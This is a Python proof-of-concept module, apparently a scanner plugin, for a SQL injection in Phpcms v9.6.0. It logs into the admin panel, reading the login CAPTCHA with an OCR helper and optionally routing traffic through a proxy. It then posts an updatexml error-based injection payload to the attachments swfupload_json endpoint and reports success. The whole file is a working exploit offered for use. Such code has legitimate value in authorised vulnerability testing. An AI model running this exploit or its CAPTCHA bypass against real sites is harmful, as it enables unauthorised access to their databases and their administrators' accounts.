# coding: utf-8
import requests
from lib.Identification_vercode import image_str

def save_img(bytes):
    with open("data/vdimgck.php", "wb") as f:
        f.write(bytes)


#Phpcms v9.6.0 sql注入
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    exp_url = url  + '/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=1%*27%*20and%*20updatexml%281%2Cconcat%280x7e%2C%28select%*20%40%40version%29%2C0x7e%29%2C1%29%23%26m%3D1%26modelid%3D1%26f%3D1%26catid%3D1'
    username = logindict.keys()
    password = logindict.values()
    #登录
    vdcode = ""
    url = url.strip("/")
    logurl = url + '/index.php?m=admin&c=index&a=login&dosubmit=1'
    header = {'User-Agent': user_agent}

    sesion = requests.session()
    # 获取验证码
    try:
        while len(vdcode) < 4:
            if proxy:
                proxies = {
                    "http": "http://%(proxy)s/" % {'proxy': proxy},
                    "https": "http://%(proxy)s/" % {'proxy': proxy}
                }
                bytes_img = sesion.get(
                    url + "/api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background=",
                    headers=header, proxies=proxies, timeout=5)
            else:
                bytes_img = sesion.get(
                    url + "/api.php?op=checkcode&code_len=4&font_size=20&width=130&height=50&font_color=&background=",
                    headers=header, timeout=5)
            bytes_img = bytes_img.content
            save_img(bytes_img)
            vdcode = image_str("data/vdimgck.php")
    except Exception as error:
        pass
    data = {
        "dosubmit": '',
        "username": username,
        "password": password,
        "code": vdcode
    }

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = sesion.post(logurl, headers=header, data=data, proxies=proxies, timeout=5)
    else:
        response = sesion.post(logurl, headers=header, data=data, timeout=5)

    if response.status_code==200 and "登录成功"==response.text:

        data={"userid_flash":"112312313acasdc"}
        if proxy:
            proxies = {
                "http": "http://%(proxy)s/" % {'proxy': proxy},
                "https": "http://%(proxy)s/" % {'proxy': proxy}
            }
            response = requests.post(exp_url, headers=header,data=data, proxies=proxies)
        else:
            response = requests.post(exp_url, headers=header,data=data)

        if '_att_json=' in response.text and response.status_code==200:
            return 'Phpcms v9.6.0 - SQL注入'


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url, logindict, user_agent, proxies)
        return result


